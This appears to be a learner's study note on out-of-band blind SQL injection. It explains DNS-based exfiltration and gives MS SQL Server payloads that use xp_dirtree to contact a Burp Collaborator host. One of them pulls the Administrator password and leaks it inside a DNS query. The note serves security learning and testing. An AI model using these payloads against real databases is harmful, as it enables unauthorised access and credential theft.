#OAST
#BLINDSQLI 

Applications may perform SQL queries asynchronously, continuing the request in the original thread and use another to execute a SQL query using the tracking cookie. The app is still vulnerable but none of the `classic` techniques will not work as the response will not reveal any data, error or the time taken to execute the query.

In this scenario exploitation may be still possible by triggering out-of-band network interactions, which will help to infer information one piece at a time or even directly exfiltrate data in network traffic.

Many network protocols can be used for exploitation, but the most effective is DNS. Many production networks allow free egress of DNS queries as they're essential for the normal operation of production systems.

## Payloads

Triggering such network interactions vary depending on the type of database used.

Generally try to combine the payloads with the following statements:

```
OR
AND
UNION
```

### MS SQL Server

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
The database will lookup for the following domain:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

# Exfiltrate data via OOB interactions

Once id confirmed that OOB interactions are possible, try to exfiltrate data from the vulnerable application:

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

The payload above queries the `Administrator` password and stores it in a variable, which is sincluded along a DNS query to a collaborator domain.

Out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.